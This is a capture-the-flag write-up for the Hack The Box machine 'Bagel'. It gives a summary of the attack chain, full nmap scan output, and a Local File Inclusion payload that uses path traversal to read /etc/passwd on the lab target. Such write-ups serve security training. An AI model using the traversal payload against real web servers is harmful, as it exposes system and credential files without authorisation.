## HTB Bagel (Medium) - Writeup

Difficulty: Medium

We began by discovering a Local File Inclusion (LFI) vulnerability in a Flask-based web application.  
Using this, we enumerated files on the system and retrieved the source code of the Flask app.  
This led us to identify a backend WebSocket service implemented in .NET. After downloading and reverse-engineering the associated .NET DLL, we extracted a hardcoded password.  
With this credential we pivoted to developer user and then escalated privileges to root with sudo command.  

---

## Nmap 

#### The nmap scan revealed three open ports:

```
┌──(root㉿kali)-[/home/kali/bagel]
└─# nmap 10.10.11.201 -p 22,5000,8000 -A 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-28 11:27 EDT
Stats: 0:01:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 11:32 (0:03:06 remaining)
Nmap scan report for 10.10.11.201
Host is up (0.039s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.8 (protocol 2.0)
| ssh-hostkey: 
|   256 6e:4e:13:41:f2:fe:d9:e0:f7:27:5b:ed:ed:cc:68:c2 (ECDSA)
|_  256 80:a7:cd:10:e7:2f:db:95:8b:86:9b:1b:20:65:2a:98 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 28 Jun 2025 15:27:40 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 28 Jun 2025 15:27:56 GMT
|     Connection: close
|   Help, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 28 Jun 2025 15:28:06 GMT
|     Content-Length: 52
|     Connection: close
|     Keep-Alive: true
|     <h1>Bad Request (Invalid request line (parts).)</h1>
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html
|     Server: Microsoft-NetCore/2.0
|     Date: Sat, 28 Jun 2025 15:27:40 GMT
|     Content-Length: 54
|     Connection: close
|     Keep-Alive: true
|_    <h1>Bad Request (Invalid request line (version).)</h1>
8000/tcp open  http-alt Werkzeug/2.2.2 Python/3.10.9
|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sat, 28 Jun 2025 15:27:40 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.2.2 Python/3.10.9
|     Date: Sat, 28 Jun 2025 15:27:35 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 263
|     Location: http://bagel.htb:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://bagel.htb:8000/?page=index.html">http://bagel.htb:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.2.2 Python/3.10.9
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5000-TCP:V=7.94SVN%I=7%D=6/28%Time=686009EC%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nServer:\x20Micros
SF:oft-NetCore/2\.0\r\nDate:\x20Sat,\x2028\x20Jun\x202025\x2015:27:40\x20G
SF:MT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,E8,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x20Microsof
SF:t-NetCore/2\.0\r\nDate:\x20Sat,\x2028\x20Jun\x202025\x2015:27:40\x20GMT
SF:\r\nContent-Length:\x2054\r\nConnection:\x20close\r\nKeep-Alive:\x20tru
SF:e\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(versio
SF:n\)\.\)</h1>")%r(HTTPOptions,73,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Server:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Sat,\x2028\x20Jun\x202025
SF:\x2015:27:56\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(Help,E6,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nServer:\x
SF:20Microsoft-NetCore/2\.0\r\nDate:\x20Sat,\x2028\x20Jun\x202025\x2015:28
SF::06\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close\r\nKeep-Ali
SF:ve:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20request\x20line\x
SF:20\(parts\)\.\)</h1>")%r(SSLSessionReq,E6,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\
SF:.0\r\nDate:\x20Sat,\x2028\x20Jun\x202025\x2015:28:06\x20GMT\r\nContent-
SF:Length:\x2052\r\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1
SF:>Bad\x20Request\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")
SF:%r(TerminalServerCookie,E6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/html\r\nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x20
SF:Sat,\x2028\x20Jun\x202025\x2015:28:06\x20GMT\r\nContent-Length:\x2052\r
SF:\nConnection:\x20close\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request
SF:\x20\(Invalid\x20request\x20line\x20\(parts\)\.\)</h1>")%r(TLSSessionRe
SF:q,E6,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\
SF:r\nServer:\x20Microsoft-NetCore/2\.0\r\nDate:\x20Sat,\x2028\x20Jun\x202
SF:025\x2015:28:06\x20GMT\r\nContent-Length:\x2052\r\nConnection:\x20close
SF:\r\nKeep-Alive:\x20true\r\n\r\n<h1>Bad\x20Request\x20\(Invalid\x20reque
SF:st\x20line\x20\(parts\)\.\)</h1>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.94SVN%I=7%D=6/28%Time=686009E7%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1EA,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.2\
SF:.2\x20Python/3\.10\.9\r\nDate:\x20Sat,\x2028\x20Jun\x202025\x2015:27:35
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
SF:th:\x20263\r\nLocation:\x20http://bagel\.htb:8000/\?page=index\.html\r\
SF:nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<ti
SF:tle>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20sh
SF:ould\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20URL
SF::\x20<a\x20href=\"http://bagel\.htb:8000/\?page=index\.html\">http://ba
SF:gel\.htb:8000/\?page=index\.html</a>\.\x20If\x20not,\x20click\x20the\x2
SF:0link\.\n")%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r
SF:\nServer:\x20Werkzeug/2\.2\.2\x20Python/3\.10\.9\r\nDate:\x20Sat,\x2028
SF:\x20Jun\x202025\x2015:27:40\x20GMT\r\nContent-Type:\x20text/html;\x20ch
SF:arset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!
SF:doctype\x20html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>
SF:\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20fo
SF:und\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20m
SF:anually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20again\.
SF:</p>\n")%r(Socks5,213,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20
SF:HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.
SF:org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\
SF:"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Err
SF:or\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<p>Message:\x20Bad\x20request\x20syntax\x20\('\\x05\\x04\
SF:\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03'\)\.</p>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\
SF:x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n
SF:\x20\x20\x20\x20</body>\n</html>\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   38.56 ms 10.10.14.1
2   39.16 ms 10.10.11.201

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.55 seconds
```

## Port 8000 - Website  

First I'll add bagel.htb to /etc/hosts file.  

![obraz](https://github.com/user-attachments/assets/2f9e704c-0021-4902-9659-a2d483639380)

Whenever I come across a parameter like page, I test it for Local File Inclusion (LFI).  

![obraz](https://github.com/user-attachments/assets/79efd237-7f9b-49a7-a3a3-55908663e578)

Basic payload worked.  

```
http://bagel.htb:8000/?page=../../../../../../etc/passwd
```







































